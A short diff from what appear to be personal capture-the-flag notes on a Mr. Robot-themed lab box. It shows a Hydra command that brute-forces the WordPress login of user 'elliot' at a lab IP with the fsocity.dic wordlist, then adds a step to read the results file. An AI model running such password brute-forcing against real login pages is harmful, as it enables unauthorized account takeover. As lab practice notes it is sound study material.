@@ -67,7 +67,8 @@ PW: ?
 3. Hydra (Find User PassWord)
         A. sudo hydra -vV -l elliot -P /home/eezy/Downloads/fsocity.dic.dic 10.10.30.50 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
       
-          Results:
+        B. Pull Results when finished
+                tail hydra3.txt
 
 
 
